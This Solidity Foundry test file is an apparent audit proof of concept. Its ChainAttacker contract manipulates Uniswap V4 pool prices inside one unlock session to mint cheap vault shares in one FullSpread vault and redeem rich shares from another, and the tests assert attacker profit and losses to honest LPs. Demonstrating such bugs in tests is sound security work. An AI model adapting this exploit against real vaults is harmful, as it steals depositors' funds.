// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {Vm} from "forge-std/Vm.sol";
import {TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault as HBase} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/hookless/test/bases/TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {Math} from "@crane/contracts/utils/Math.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/callback/IUnlockCallback.sol";
import {IHooks} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IHooks.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolId.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {BalanceDelta, BalanceDeltaLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/BalanceDelta.sol";
import {ModifyLiquidityParams, SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {TickMath} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TickMath.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {FullMath} from "@crane/contracts/protocols/dexes/uniswap/libraries/FullMath.sol";
import {IStandardExchangeProxy} from "contracts/interfaces/proxies/IStandardExchangeProxy.sol";
import {IStandardExchangeOut} from "@crane/contracts/interfaces/IStandardExchangeOut.sol";
import {IStandardExchangeInMulti} from "contracts/interfaces/IStandardExchangeInMulti.sol";
import {IStandardExchangeOutMulti} from "contracts/interfaces/IStandardExchangeOutMulti.sol";

interface IFSReserve {
    function deployedReserve() external view returns (uint256, uint256);
    function canOpenPoolManagerUnlock() external view returns (bool);
}

/// @notice One unprivileged attacker. In ONE PoolManager.unlock session it drives blocked mode on
/// several independent FullSpread vaults that share the same PoolManager, and extracts from each.
/// - Leg A (fs-blocked-entry-spot-mint): push pool A up, blocked single-sided mint cheap, restore.
/// - Leg B (fs-blocked-exit-sleeve): push pool B down, blocked redeem rich from the sleeve, restore.
/// Only its own capital is used; every price move is a V4 swap whose delta the attacker settles in-tx.
contract ChainAttacker is IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    IPoolManager immutable pm;

    // Leg A: entry (mint cheap)
    IStandardExchangeProxy public vaultA;
    PoolKey keyA;
    IERC20 a0;
    IERC20 a1;
    // Leg B: exit (redeem rich)
    IStandardExchangeProxy public vaultB;
    PoolKey keyB;
    IERC20 b0;
    IERC20 b1;

    uint256 public mintedSharesA;

    constructor(IPoolManager pm_) { pm = pm_; }

    function setLegA(IStandardExchangeProxy v, PoolKey memory k, IERC20 t0, IERC20 t1) external {
        vaultA = v; keyA = k; a0 = t0; a1 = t1;
        t0.approve(address(v), type(uint256).max); t1.approve(address(v), type(uint256).max);
    }

    function setLegB(IStandardExchangeProxy v, PoolKey memory k, IERC20 t0, IERC20 t1) external {
        vaultB = v; keyB = k; b0 = t0; b1 = t1;
        t0.approve(address(v), type(uint256).max); t1.approve(address(v), type(uint256).max);
    }

    /// Pre-buy fair-priced shares in vault B so leg B can redeem them later (done idle, pre-attack).
    function depositB(uint256 amt0, uint256 amt1) external returns (uint256 shares) {
        address[] memory toks = new address[](2); toks[0] = address(b0); toks[1] = address(b1);
        uint256[] memory amts = new uint256[](2); amts[0] = amt0; amts[1] = amt1;
        shares = IStandardExchangeInMulti(address(vaultB)).exchangeInManyToOne(
            toks, amts, IERC20(address(vaultB)), 0, address(this), false, block.timestamp);
    }

    /// doA/doB flags let us run each leg alone (for the single-primitive comparison) or together.
    function run(bool doA, bool doB, uint256 depA) external {
        pm.unlock(abi.encode(doA, doB, depA));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm), "pm only");
        (bool doA, bool doB, uint256 depA) = abi.decode(data, (bool, bool, uint256));
        if (doA) _legEntry(depA);
        if (doB) _legExit();
        return "";
    }

    // --- Leg A: blocked single-sided entry after a 2x up-push, then restore ---
    function _legEntry(uint256 depA) internal {
        (uint160 sp0,,,) = pm.getSlot0(keyA.toId());
        require(!IFSReserve(address(vaultA)).canOpenPoolManagerUnlock(), "A not blocked");
        uint160 target = uint160(uint256(sp0) * 2); // k=4
        _swap(keyA, a0, a1, false, target);mintedSharesA = vaultA.exchangeIn(a0, depA, IERC20(address(vaultA)), 0, address(this), false, block.timestamp);
        _swap(keyA, a0, a1, true, sp0);
        (uint160 sp1,,,) = pm.getSlot0(keyA.toId());
        require(sp1 == sp0, "A price not restored");
    }

    // --- Leg B: blocked redeem rich after a down-push (r=1.30), then restore ---
    function _legExit() internal {
        (uint160 sp0,,,) = pm.getSlot0(keyB.toId());
        require(!IFSReserve(address(vaultB)).canOpenPoolManagerUnlock(), "B not blocked");
        uint160 down = uint160(uint256(sp0) * 10_000 / 13_000);
        BalanceDelta d = pm.swap(keyB, SwapParams(true, -int256(1e36), down), "");
        int256 n0 = d.amount0(); int256 n1 = d.amount1();
        uint256 shares = vaultB.balanceOf(address(this));vaultB.exchangeIn(IERC20(address(vaultB)), shares, b0, 0, address(this), false, block.timestamp);
        d = pm.swap(keyB, SwapParams(false, -int256(1e36), sp0), "");
        n0 += d.amount0(); n1 += d.amount1();
        // clear residual token1 debt (swap fees) with a tiny exact-out swap
        if (n1 < 0 && uint256(-n1) > b1.balanceOf(address(this))) {
            d = pm.swap(keyB, SwapParams(true, int256(-n1), TickMath.MIN_SQRT_PRICE + 1), "");
            n0 += d.amount0(); n1 += d.amount1();
        }
        _settle(keyB.currency0, n0);
        _settle(keyB.currency1, n1);
        (uint160 sp1,,,) = pm.getSlot0(keyB.toId());
        require(sp1 >= sp0 - sp0/400 && sp1 <= sp0 + sp0/400, "B price not restored");
    }

    function _swap(PoolKey memory k, IERC20, IERC20, bool zeroForOne, uint160 limit) internal {
        BalanceDelta d = pm.swap(k, SwapParams(zeroForOne, -int256(1e30), limit), "");
        _settle(k.currency0, d.amount0());
        _settle(k.currency1, d.amount1());
    }

    function _settle(Currency c, int256 delta) internal {
        if (delta < 0) {
            pm.sync(c);
            IERC20(Currency.unwrap(c)).transfer(address(pm), uint256(-delta));
            pm.settle();
        } else if (delta > 0) {
            pm.take(c, address(this), uint256(delta));
        }
    }

    /// idle proportional dual exit of all leg-A shares (PM locked => vault idle)
    function exitAllA(uint256 x0, uint256 x1) external returns (uint256) {
        address[] memory toks = new address[](2); toks[0] = address(a0); toks[1] = address(a1);
        uint256[] memory amts = new uint256[](2); amts[0] = x0; amts[1] = x1;
        return IStandardExchangeOutMulti(address(vaultA)).exchangeOutOneToMany(
            IERC20(address(vaultA)), vaultA.balanceOf(address(this)), toks, amts, address(this), false, block.timestamp);
    }
}

contract ChainBlockedSessionTest is HBase, IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    uint256 constant CAP = 10_000_000e18;

    // pool A (entry)
    IStandardExchangeProxy vA; PoolKey kA; IERC20 a0; IERC20 a1;
    // pool B (exit)
    IStandardExchangeProxy vB; PoolKey kB; IERC20 b0; IERC20 b1;

    ChainAttacker attacker;

    // leg-A vault position (for NAV incl. fees)
    bytes32 saltA; int24 loA; int24 hiA; bool foundA;

    uint128 constant EXT_LIQ = 2_000e18;
    uint256 constant VICTIM_A = 1_000e18;    // honest LP in vault A
    uint256 constant VICTIM_B = 10_000e18;   // honest LP in vault B
    uint256 constant ATTACKER_B_DEP = 300e18; // attacker fair pre-deposit in vault B
    uint256 constant DEP_A = 800e18;          // attacker single-sided blocked deposit in vault A

    uint160 spB0;

    function setUp() public override {
        HBase.setUp();
        (a0, a1) = _mkPair();
        (b0, b1) = _mkPair();
        kA = PoolKey(Currency.wrap(address(a0)), Currency.wrap(address(a1)), 3_000, 60, IHooks(address(0)));
        kB = PoolKey(Currency.wrap(address(b0)), Currency.wrap(address(b1)), 3_000, 60, IHooks(address(0)));
        poolManager.initialize(kA, uint160(1 << 96));
        poolManager.initialize(kB, uint160(1 << 96));
        _seed(kA, a0, a1);
        _seed(kB, b0, b1);

        vA = IStandardExchangeProxy(uniswapV4StandardExchangeDFPkg.deployVault(kA));
        vB = IStandardExchangeProxy(uniswapV4StandardExchangeDFPkg.deployVault(kB));

        // honest LPs (this contract is the victim in both vaults)
        _approve(a0, a1, address(vA)); _approve(b0, b1, address(vB));
        vm.recordLogs();
        _victimDeposit(vA, a0, a1, VICTIM_A);
        _captureA();
        _victimDeposit(vB, b0, b1, VICTIM_B);

        (spB0,,,) = poolManager.getSlot0(kB.toId());

        attacker = new ChainAttacker(poolManager);
        attacker.setLegA(vA, kA, a0, a1);
        attacker.setLegB(vB, kB, b0, b1);
        a0.transfer(address(attacker), CAP); a1.transfer(address(attacker), CAP);
        b0.transfer(address(attacker), CAP); b1.transfer(address(attacker), CAP);

        // attacker pre-buys fair shares in vault B (idle), before the attack block
        vm.prank(address(0xA77AC4E5), address(0xA77AC4E5));
        attacker.depositB(ATTACKER_B_DEP, ATTACKER_B_DEP);
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 12);
    }

    // ----- fixture helpers -----
    function _mkPair() internal returns (IERC20 t0, IERC20 t1) {
        IERC20 x = IERC20(address(new ERC20PermitMintableStub("X", "X", 18, address(this), 1e32)));
        IERC20 y = IERC20(address(new ERC20PermitMintableStub("Y", "Y", 18, address(this), 1e32)));
        (t0, t1) = address(x) < address(y) ? (x, y) : (y, x);
    }

    function _approve(IERC20 t0, IERC20 t1, address v) internal {
        t0.approve(v, type(uint256).max); t1.approve(v, type(uint256).max);
    }

    function _seed(PoolKey memory k, IERC20, IERC20) internal {
        poolManager.unlock(abi.encode(k));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(poolManager));
        PoolKey memory k = abi.decode(data, (PoolKey));
        (BalanceDelta delta,) = poolManager.modifyLiquidity(k, ModifyLiquidityParams(
            TickMath.minUsableTick(60), TickMath.maxUsableTick(60), int256(uint256(EXT_LIQ)), bytes32(0)), "");
        if (delta.amount0() < 0) { poolManager.sync(k.currency0); IERC20(Currency.unwrap(k.currency0)).transfer(address(poolManager), uint128(-delta.amount0())); poolManager.settle(); }
        if (delta.amount1() < 0) { poolManager.sync(k.currency1); IERC20(Currency.unwrap(k.currency1)).transfer(address(poolManager), uint128(-delta.amount1())); poolManager.settle(); }
        return "";
    }

    function _victimDeposit(IStandardExchangeProxy v, IERC20 t0, IERC20 t1, uint256 amt) internal {
        address[] memory toks = new address[](2); toks[0] = address(t0); toks[1] = address(t1);
        uint256[] memory amts = new uint256[](2); amts[0] = amt; amts[1] = amt;
        IStandardExchangeInMulti(address(v)).exchangeInManyToOne(toks, amts, IERC20(address(v)), 0, address(this), false, block.timestamp);
    }

    function _captureA() internal {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 sig = keccak256("ModifyLiquidity(bytes32,address,int24,int24,int256,bytes32)");
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter == address(poolManager) && logs[i].topics[0] == sig
                && address(uint160(uint256(logs[i].topics[2]))) == address(vA)) {
                (loA, hiA,, saltA) = abi.decode(logs[i].data, (int24, int24, int256, bytes32));
                foundA = true;
            }
        }
        require(foundA, "vault A position not found");
    }

    // ----- valuation (all pools 1:1, 18dp => value = sum of raw balances) -----
    function _backingA() internal view returns (uint256 x0, uint256 x1) {
        (uint256 d0, uint256 d1) = IFSReserve(address(vA)).deployedReserve();
        (uint128 liq, uint256 l0, uint256 l1) = poolManager.getPositionInfo(kA.toId(), address(vA), loA, hiA, saltA);
        (uint256 g0, uint256 g1) = poolManager.getFeeGrowthInside(kA.toId(), loA, hiA);
        uint256 e0; uint256 e1;
        unchecked { e0 = FullMath.mulDiv(g0 - l0, liq, uint256(1) << 128); e1 = FullMath.mulDiv(g1 - l1, liq, uint256(1) << 128); }
        x0 = a0.balanceOf(address(vA)) + d0 + e0;
        x1 = a1.balanceOf(address(vA)) + d1 + e1;
    }

    function _navB() internal view returns (uint256) {
        (uint256 d0, uint256 d1) = IFSReserve(address(vB)).deployedReserve();
        int24 lo = TickMath.minUsableTick(60); int24 hi = TickMath.maxUsableTick(60);
        (uint128 lv, uint256 l0, uint256 l1) = poolManager.getPositionInfo(kB.toId(), address(vB), lo, hi, bytes32(0));
        (uint256 g0, uint256 g1) = poolManager.getFeeGrowthInside(kB.toId(), lo, hi);
        uint256 e0; uint256 e1;
        unchecked { e0 = FullMath.mulDiv(g0 - l0, lv, uint256(1) << 128); e1 = FullMath.mulDiv(g1 - l1, lv, uint256(1) << 128); }
        uint256 tot = b0.balanceOf(address(vB)) + d0 + e0 + b1.balanceOf(address(vB)) + d1 + e1;
        return FullMath.mulDiv(tot, 1e18, vB.totalSupply());
    }

    function _attackerValue() internal view returns (uint256 v) {
        v = a0.balanceOf(address(attacker)) + a1.balanceOf(address(attacker))
          + b0.balanceOf(address(attacker)) + b1.balanceOf(address(attacker));
        // count any vault shares the attacker holds at their fair NAV, so redeeming pre-bought
        // shares into tokens is NOT mistaken for profit.
        uint256 sA = vA.balanceOf(address(attacker));
        if (sA > 0) { (uint256 x0, uint256 x1) = _backingA(); v += FullMath.mulDiv(sA, x0 + x1, vA.totalSupply()); }
        uint256 sB = vB.balanceOf(address(attacker));
        if (sB > 0) v += FullMath.mulDiv(sB, _navB(), 1e18);
    }

    function _exitA() internal {
        uint256 s = vA.balanceOf(address(attacker));
        if (s == 0) return;
        uint256 S = vA.totalSupply();
        (uint256 x0, uint256 x1) = _backingA();
        for (uint256 t = s; t + 60 > s; --t) {
            uint256 c0 = x0 * t / S; uint256 c1 = x1 * t / S;
            if (FullMath.mulDivRoundingUp(c0, S, x0) != FullMath.mulDivRoundingUp(c1, S, x1)) continue;
            attacker.exitAllA(c0, c1);
            return;
        }
        revert("exitA sizing failed");
    }

    struct Snap { uint256 atk; uint256 vAshares; uint256 vAnav; uint256 vBshares; uint256 vBnav; }

    function _snap() internal view returns (Snap memory s) {
        s.atk = _attackerValue();
        s.vAshares = vA.balanceOf(address(this));
        (uint256 x0, uint256 x1) = _backingA();
        s.vAnav = FullMath.mulDiv(x0 + x1, 1e18, vA.totalSupply());
        s.vBshares = vB.balanceOf(address(this));
        s.vBnav = _navB();
    }

    function _report(string memory tag, Snap memory pre) internal returns (int256 profit, int256 victimLoss) {
        _exitA();
        Snap memory post = _snap();
        profit = int256(_attackerValue()) - int256(pre.atk);
        int256 lossA = int256(FullMath.mulDiv(pre.vAshares, pre.vAnav, 1e18)) - int256(FullMath.mulDiv(pre.vAshares, post.vAnav, 1e18));
        int256 lossB = int256(FullMath.mulDiv(pre.vBshares, pre.vBnav, 1e18)) - int256(FullMath.mulDiv(pre.vBshares, post.vBnav, 1e18));
        victimLoss = lossA + lossB;
        console2.log("====", tag);
        console2.log("ATTACKER NET PROFIT (P=1, all fees paid)"); console2.logInt(profit);
        console2.log("  victim loss vault A"); console2.logInt(lossA);
        console2.log("  victim loss vault B"); console2.logInt(lossB);
        console2.log("TOTAL VICTIM LOSS"); console2.logInt(victimLoss);
    }

    // ---- single primitives (baselines) ----
    function test_only_entry() public returns (int256 p) {
        Snap memory pre = _snap();
        attacker.run(true, false, DEP_A);
        (p,) = _report("ONLY ENTRY (leg A)", pre);
        assertGt(p, 0, "entry profit");
    }

    function test_only_exit() public returns (int256 p) {
        Snap memory pre = _snap();
        attacker.run(false, true, 0);
        (p,) = _report("ONLY EXIT (leg B)", pre);
        assertGt(p, 0, "exit profit");
    }

    // ---- composite ----
    function test_composite_entry_plus_exit() public {
        // measure each leg alone on identical fresh state
        uint256 s1 = vm.snapshotState();
        int256 pEntry = test_only_entry();
        vm.revertToState(s1);
        uint256 s2 = vm.snapshotState();
        int256 pExit = test_only_exit();
        vm.revertToState(s2);

        Snap memory pre = _snap();
        attacker.run(true, true, DEP_A); // BOTH legs in ONE unlock
        (int256 pBoth, int256 vLoss) = _report("COMPOSITE: entry+exit in ONE unlock", pre);
        console2.log("leg-entry alone"); console2.logInt(pEntry);
        console2.log("leg-exit alone"); console2.logInt(pExit);
        console2.log("composite"); console2.logInt(pBoth);
        int256 best = pEntry > pExit ? pEntry : pExit;
        assertGt(pBoth, best, "composite beats best single primitive");
        assertGt(pBoth, 0, "composite profitable");
        assertGt(vLoss, int256(0), "victims lose in aggregate");
    }
}
